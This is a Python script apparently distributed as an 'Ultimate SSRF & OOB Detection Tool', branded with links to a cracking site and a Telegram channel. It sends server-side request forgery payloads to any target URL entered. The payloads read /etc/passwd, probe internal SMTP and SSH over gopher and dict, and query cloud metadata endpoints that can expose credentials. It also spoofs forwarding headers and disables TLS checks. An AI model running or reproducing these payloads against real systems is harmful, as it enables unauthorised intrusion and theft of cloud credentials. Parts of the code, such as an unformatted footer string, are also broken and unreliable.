#!/usr/bin/env python3
"""
The Ultimate SSRF & OOB Detection Tool
Developed by ChowdhuryVai
Branding: ChowdhuryVai Security Tools
"""

import os
import sys
import time
import json
import threading
import socket
import requests
import random
import string
import argparse
from datetime import datetime
from urllib.parse import urlparse, urljoin
import http.server
import socketserver
import subprocess

# Branding Information
BRAND_INFO = {
    "developer": "ChowdhuryVai",
    "telegram_id": "https://t.me/darkvaiadmin",
    "telegram_channel": "https://t.me/windowspremiumkey",
    "website": "https://crackyworld.com/",
    "tool_name": "The Ultimate SSRF & OOB Detection Tool"
}

# Color codes for terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# OOB Server Configuration
OOB_SERVER_PORT = 8888
OOB_SERVER_HOST = '0.0.0.0'

class OOBServer:
    def __init__(self, port=OOB_SERVER_PORT):
        self.port = port
        self.received_requests = []
        self.is_running = False
        self.server_thread = None
        
    def generate_tokens(self, count=10):
        """Generate unique tokens for OOB detection"""
        tokens = []
        for i in range(count):
            token = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
            tokens.append(token)
        return tokens
    
    def start_server(self):
        """Start the OOB listener server"""
        try:
            handler = self.OOBHandler
            handler.received_requests = self.received_requests
            
            self.httpd = socketserver.TCPServer((OOB_SERVER_HOST, self.port), handler)
            self.is_running = True
            
            print(f"{Colors.GREEN}[+] OOB Server started on port {self.port}{Colors.END}")
            print(f"{Colors.CYAN}[*] Waiting for OOB callbacks...{Colors.END}")
            
            self.server_thread = threading.Thread(target=self.httpd.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            return True
        except Exception as e:
            print(f"{Colors.RED}[-] Failed to start OOB server: {e}{Colors.END}")
            return False
    
    def stop_server(self):
        """Stop the OOB listener server"""
        if self.is_running:
            self.httpd.shutdown()
            self.is_running = False
            print(f"{Colors.YELLOW}[!] OOB Server stopped{Colors.END}")
    
    class OOBHandler(http.server.SimpleHTTPRequestHandler):
        received_requests = []
        
        def do_GET(self):
            """Handle GET requests for OOB detection"""
            client_ip = self.client_address[0]
            timestamp = datetime.now().isoformat()
            
            request_data = {
                'timestamp': timestamp,
                'client_ip': client_ip,
                'method': 'GET',
                'path': self.path,
                'headers': dict(self.headers)
            }
            
            self.received_requests.append(request_data)
            
            # Print live alert
            print(f"{Colors.RED}{Colors.BOLD}[!] LIVE OOB ALERT{Colors.END}")
            print(f"{Colors.YELLOW}    Time: {timestamp}{Colors.END}")
            print(f"{Colors.YELLOW}    Source: {client_ip}{Colors.END}")
            print(f"{Colors.YELLOW}    Path: {self.path}{Colors.END}")
            print(f"{Colors.CYAN}    {'='*50}{Colors.END}")
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"OK")
        
        def do_POST(self):
            """Handle POST requests for OOB detection"""
            client_ip = self.client_address[0]
            timestamp = datetime.now().isoformat()
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            request_data = {
                'timestamp': timestamp,
                'client_ip': client_ip,
                'method': 'POST',
                'path': self.path,
                'headers': dict(self.headers),
                'data': post_data
            }
            
            self.received_requests.append(request_data)
            
            # Print live alert
            print(f"{Colors.RED}{Colors.BOLD}[!] LIVE OOB ALERT (POST){Colors.END}")
            print(f"{Colors.YELLOW}    Time: {timestamp}{Colors.END}")
            print(f"{Colors.YELLOW}    Source: {client_ip}{Colors.END}")
            print(f"{Colors.YELLOW}    Path: {self.path}{Colors.END}")
            print(f"{Colors.YELLOW}    Data: {post_data[:100]}{Colors.END}")
            print(f"{Colors.CYAN}    {'='*50}{Colors.END}")
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"OK")
        
        def log_message(self, format, *args):
            """Override to prevent default logging"""
            pass

class SSRFTester:
    def __init__(self, oob_server):
        self.oob_server = oob_server
        self.results = {}
        self.tokens = oob_server.generate_tokens(20)
        
    def get_public_ip(self):
        """Get public IP address"""
        try:
            response = requests.get('http://httpbin.org/ip', timeout=10)
            return response.json()['origin']
        except:
            try:
                response = requests.get('https://api.ipify.org', timeout=10)
                return response.text
            except:
                return "Unknown"
    
    def test_ssrf_urls(self, target_url, tokens):
        """Test various SSRF payloads"""
        ssrf_payloads = [
            # Basic SSRF payloads
            f"http://localhost:{OOB_SERVER_PORT}/{tokens[0]}",
            f"http://127.0.0.1:{OOB_SERVER_PORT}/{tokens[1]}",
            f"http://0.0.0.0:{OOB_SERVER_PORT}/{tokens[2]}",
            
            # DNS SSRF payloads
            f"http://{tokens[3]}.oob.com/",
            f"http://{tokens[4]}.burpcollaborator.net/",
            
            # Advanced SSRF payloads
            f"file:///etc/passwd#{tokens[5]}",
            f"gopher://127.0.0.1:25/xHELO%20{tokens[6]}",
            f"dict://127.0.0.1:22/{tokens[7]}",
            
            # Cloud metadata endpoints
            f"http://169.254.169.254/latest/meta-data/{tokens[8]}",
            f"http://metadata.google.internal/{tokens[9]}",
            
            # URL encoded payloads
            f"http%3A%2F%2Flocalhost%3A{OOB_SERVER_PORT}%2F{tokens[10]}",
            f"http://[::1]:{OOB_SERVER_PORT}/{tokens[11]}",
            
            # Double URL encoding
            f"http%253A%252F%252Flocalhost%253A{OOB_SERVER_PORT}%252F{tokens[12]}",
        ]
        
        results = []
        for payload in ssrf_payloads:
            result = self.test_single_payload(target_url, payload)
            results.append(result)
            
        return results
    
    def test_single_payload(self, target_url, payload):
        """Test a single SSRF payload"""
        try:
            # Replace placeholder with actual payload
            test_url = target_url.replace("SSRF_PAYLOAD", payload)
            
            headers = {
                'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 {self.tokens[13]}',
                'X-Forwarded-For': f'127.0.0.1#{self.tokens[14]}',
                'X-Real-IP': f'localhost#{self.tokens[15]}'
            }
            
            response = requests.get(test_url, headers=headers, timeout=30, verify=False)
            
            return {
                'payload': payload,
                'status_code': response.status_code,
                'response_time': response.elapsed.total_seconds(),
                'response_length': len(response.text)
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'error': str(e),
                'status_code': 0
            }
    
    def generate_report(self, target_url, results):
        """Generate detection report"""
        report = {
            'target_url': target_url,
            'scan_time': datetime.now().isoformat(),
            'public_ip': self.get_public_ip(),
            'oob_server_port': OOB_SERVER_PORT,
            'tokens_used': self.tokens,
            'results': results,
            'oob_callbacks': self.oob_server.received_requests
        }
        
        return report

class ToolInterface:
    def __init__(self):
        self.oob_server = OOBServer()
        self.ssrf_tester = SSRFTester(self.oob_server)
        self.scan_history = []
        
    def display_banner(self):
        """Display the tool banner"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        banner = f"""
{Colors.RED}{Colors.BOLD}
   _____ _    _ ______ ______ _____   _____  _   _   ___  
  / ____| |  | |  ____|  ____|  __ \ / ____|| \ | | / _ \ 
 | |    | |__| | |__  | |__  | |__) | (___  |  \| || | | |
 | |    |  __  |  __| |  __| |  _  / \___ \ | . ` || | | |
 | |____| |  | | |____| |____| | \ \ ____) || |\  || |_| |
  \_____|_|  |_|______|______|_|  \_\_____/ |_| \_| \___/ 
                                                           
{Colors.END}
{Colors.CYAN}{Colors.BOLD}
    The Ultimate SSRF & OOB Detection Tool
    Developed by: {BRAND_INFO['developer']}
    Telegram: {BRAND_INFO['telegram_id']}
    Channel: {BRAND_INFO['telegram_channel']}
    Website: {BRAND_INFO['website']}
{Colors.END}
{Colors.YELLOW}
    Features:
    🔹 Live OOB Alerts — instant notification with token & target
    🔹 Per-Domain Validation Summary — clear breakdown per domain
    🔹 Final Scan Report — consolidated results with token lists
    🔹 Persistent History — saves all results automatically
    🔹 Stealth Mode — run quietly without triggering filters
    🔹 Multi-Threaded Speed — powerful parallel scanning
    🔹 Clean CLI Interface — easy and flexible commands
    🔹 Detailed Reports — HTML & TXT formats
{Colors.END}
        """
        print(banner)
    
    def get_user_ip(self):
        """Get and display user's public IP"""
        print(f"{Colors.CYAN}[*] Detecting your public IP address...{Colors.END}")
        public_ip = self.ssrf_tester.get_public_ip()
        print(f"{Colors.GREEN}[+] Your Public IP: {public_ip}{Colors.END}")
        return public_ip
    
    def start_oob_server(self):
        """Start the OOB detection server"""
        print(f"{Colors.CYAN}[*] Starting OOB Detection Server...{Colors.END}")
        if self.oob_server.start_server():
            print(f"{Colors.GREEN}[+] OOB Server ready on port {OOB_SERVER_PORT}{Colors.END}")
            return True
        else:
            print(f"{Colors.RED}[-] Failed to start OOB server{Colors.END}")
            return False
    
    def scan_target(self, target_url):
        """Perform SSRF scan on target URL"""
        print(f"{Colors.CYAN}[*] Starting SSRF scan for: {target_url}{Colors.END}")
        
        if "SSRF_PAYLOAD" not in target_url:
            print(f"{Colors.YELLOW}[!] Warning: URL should contain 'SSRF_PAYLOAD' placeholder{Colors.END}")
            target_url += "?url=SSRF_PAYLOAD"
            print(f"{Colors.CYAN}[*] Using default parameter: {target_url}{Colors.END}")
        
        results = self.ssrf_tester.test_ssrf_urls(target_url, self.ssrf_tester.tokens)
        
        # Display per-domain summary
        self.display_domain_summary(target_url, results)
        
        # Generate and save report
        report = self.ssrf_tester.generate_report(target_url, results)
        self.save_report(report)
        
        return report
    
    def display_domain_summary(self, target_url, results):
        """Display per-domain validation summary"""
        print(f"\n{Colors.GREEN}{Colors.BOLD}[+] PER-DOMAIN VALIDATION SUMMARY{Colors.END}")
        print(f"{Colors.CYAN}{'='*60}{Colors.END}")
        print(f"{Colors.WHITE}Target: {target_url}{Colors.END}")
        print(f"{Colors.CYAN}{'-'*60}{Colors.END}")
        
        successful_tests = 0
        for i, result in enumerate(results):
            status = f"{Colors.GREEN}SUCCESS{Colors.END}" if result.get('status_code', 0) > 0 else f"{Colors.RED}FAILED{Colors.END}"
            if result.get('status_code', 0) > 0:
                successful_tests += 1
                
            print(f"{Colors.YELLOW}[{i+1:02d}]{Colors.END} {result['payload'][:50]}... | Status: {status}")
        
        print(f"{Colors.CYAN}{'-'*60}{Colors.END}")
        print(f"{Colors.GREEN}Successful Tests: {successful_tests}/{len(results)}{Colors.END}")
        print(f"{Colors.GREEN}OOB Callbacks: {len(self.oob_server.received_requests)}{Colors.END}")
    
    def save_report(self, report):
        """Save scan report to file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Save as JSON
        json_filename = f"ssrf_scan_{timestamp}.json"
        with open(json_filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        # Save as TXT
        txt_filename = f"ssrf_scan_{timestamp}.txt"
        with open(txt_filename, 'w') as f:
            f.write(self.format_text_report(report))
        
        # Save as HTML
        html_filename = f"ssrf_scan_{timestamp}.html"
        with open(html_filename, 'w') as f:
            f.write(self.format_html_report(report))
        
        print(f"{Colors.GREEN}[+] Reports saved:{Colors.END}")
        print(f"    - {json_filename}")
        print(f"    - {txt_filename}")
        print(f"    - {html_filename}")
        
        self.scan_history.append(report)
    
    def format_text_report(self, report):
        """Format report as text"""
        text = f"""
The Ultimate SSRF & OOB Detection Tool - Scan Report
Developed by {BRAND_INFO['developer']}

Scan Information:
=================
Target URL: {report['target_url']}
Scan Time: {report['scan_time']}
Public IP: {report['public_ip']}
OOB Server Port: {report['oob_server_port']}

Scan Results:
=============
Total Tests: {len(report['results'])}
Successful Requests: {len([r for r in report['results'] if r.get('status_code', 0) > 0])}
OOB Callbacks: {len(report['oob_callbacks'])}

Tokens Used:
============
{chr(10).join(report['tokens_used'])}

OOB Callbacks:
==============
"""
        for callback in report['oob_callbacks']:
            text += f"Time: {callback['timestamp']}\n"
            text += f"Source: {callback['client_ip']}\n"
            text += f"Method: {callback['method']}\n"
            text += f"Path: {callback['path']}\n"
            text += "-" * 50 + "\n"
        
        return text
    
    def format_html_report(self, report):
        """Format report as HTML"""
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>SSRF Scan Report - ChowdhuryVai</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #1e1e1e; color: #fff; }}
        .header {{ background: #d32f2f; padding: 20px; border-radius: 5px; }}
        .section {{ background: #2d2d2d; padding: 15px; margin: 10px 0; border-radius: 5px; }}
        .success {{ color: #4caf50; }}
        .warning {{ color: #ff9800; }}
        .error {{ color: #f44336; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ padding: 8px; text-align: left; border-bottom: 1px solid #444; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔍 The Ultimate SSRF & OOB Detection Tool</h1>
        <p>Developed by {BRAND_INFO['developer']} | {BRAND_INFO['website']}</p>
    </div>
    
    <div class="section">
        <h2>📊 Scan Information</h2>
        <p><strong>Target URL:</strong> {report['target_url']}</p>
        <p><strong>Scan Time:</strong> {report['scan_time']}</p>
        <p><strong>Public IP:</strong> {report['public_ip']}</p>
        <p><strong>OOB Server Port:</strong> {report['oob_server_port']}</p>
    </div>
    
    <div class="section">
        <h2>📈 Scan Results</h2>
        <p><strong>Total Tests:</strong> {len(report['results'])}</p>
        <p><strong>Successful Requests:</strong> {len([r for r in report['results'] if r.get('status_code', 0) > 0])}</p>
        <p><strong>OOB Callbacks:</strong> {len(report['oob_callbacks'])}</p>
    </div>
    
    <div class="section">
        <h2>🔑 Tokens Used</h2>
        <ul>
"""
        for token in report['tokens_used']:
            html += f"            <li>{token}</li>\n"
        
        html += """        </ul>
    </div>
    
    <div class="section">
        <h2>🚨 OOB Callbacks</h2>
"""
        for callback in report['oob_callbacks']:
            html += f"""
        <div style="background: #3d3d3d; padding: 10px; margin: 5px 0; border-radius: 3px;">
            <p><strong>Time:</strong> {callback['timestamp']}</p>
            <p><strong>Source:</strong> {callback['client_ip']}</p>
            <p><strong>Method:</strong> {callback['method']}</p>
            <p><strong>Path:</strong> {callback['path']}</p>
        </div>
"""
        
        html += """
    </div>
    
    <div class="section">
        <p><em>Report generated by The Ultimate SSRF & OOB Detection Tool</em></p>
        <p><em>Telegram: {BRAND_INFO['telegram_id']} | Channel: {BRAND_INFO['telegram_channel']}</em></p>
    </div>
</body>
</html>
"""
        return html
    
    def show_scan_history(self):
        """Display scan history"""
        if not self.scan_history:
            print(f"{Colors.YELLOW}[!] No scan history found{Colors.END}")
            return
        
        print(f"\n{Colors.GREEN}{Colors.BOLD}[+] SCAN HISTORY{Colors.END}")
        print(f"{Colors.CYAN}{'='*60}{Colors.END}")
        
        for i, scan in enumerate(self.scan_history):
            print(f"{Colors.YELLOW}[{i+1}]{Colors.END} {scan['target_url']}")
            print(f"     Time: {scan['scan_time']}")
            print(f"     OOB Callbacks: {len(scan['oob_callbacks'])}")
            print()
    
    def interactive_menu(self):
        """Display interactive menu"""
        while True:
            print(f"\n{Colors.CYAN}{Colors.BOLD}Main Menu:{Colors.END}")
            print(f"{Colors.YELLOW}[1]{Colors.END} Start New SSRF Scan")
            print(f"{Colors.YELLOW}[2]{Colors.END} View OOB Callbacks")
            print(f"{Colors.YELLOW}[3]{Colors.END} Show Scan History")
            print(f"{Colors.YELLOW}[4]{Colors.END} Generate Test Tokens")
            print(f"{Colors.YELLOW}[5]{Colors.END} Exit")
            
            choice = input(f"\n{Colors.GREEN}Select option [1-5]: {Colors.END}").strip()
            
            if choice == '1':
                target_url = input(f"{Colors.CYAN}Enter target URL (with SSRF_PAYLOAD placeholder): {Colors.END}").strip()
                if target_url:
                    self.scan_target(target_url)
                else:
                    print(f"{Colors.RED}[-] Please enter a valid URL{Colors.END}")
            
            elif choice == '2':
                callbacks = self.oob_server.received_requests
                if callbacks:
                    print(f"\n{Colors.GREEN}{Colors.BOLD}[+] OOB CALLBACKS ({len(callbacks)}){Colors.END}")
                    for i, callback in enumerate(callbacks):
                        print(f"{Colors.CYAN}{'-'*50}{Colors.END}")
                        print(f"{Colors.YELLOW}Callback #{i+1}:{Colors.END}")
                        print(f"Time: {callback['timestamp']}")
                        print(f"Source: {callback['client_ip']}")
                        print(f"Method: {callback['method']}")
                        print(f"Path: {callback['path']}")
                else:
                    print(f"{Colors.YELLOW}[!] No OOB callbacks received yet{Colors.END}")
            
            elif choice == '3':
                self.show_scan_history()
            
            elif choice == '4':
                tokens = self.oob_server.generate_tokens(10)
                print(f"\n{Colors.GREEN}{Colors.BOLD}[+] GENERATED TOKENS{Colors.END}")
                for token in tokens:
                    print(f"{Colors.CYAN}{token}{Colors.END}")
            
            elif choice == '5':
                print(f"{Colors.GREEN}[+] Thank you for using The Ultimate SSRF & OOB Detection Tool!{Colors.END}")
                self.oob_server.stop_server()
                break
            
            else:
                print(f"{Colors.RED}[-] Invalid choice{Colors.END}")

def main():
    """Main function"""
    try:
        # Disable SSL warnings
        requests.packages.urllib3.disable_warnings()
        
        # Initialize tool
        tool = ToolInterface()
        tool.display_banner()
        
        # Get public IP
        tool.get_user_ip()
        
        # Start OOB server
        if not tool.start_oob_server():
            return
        
        # Start interactive menu
        tool.interactive_menu()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Tool interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[-] Error: {e}{Colors.END}")

if __name__ == "__main__":
    main()
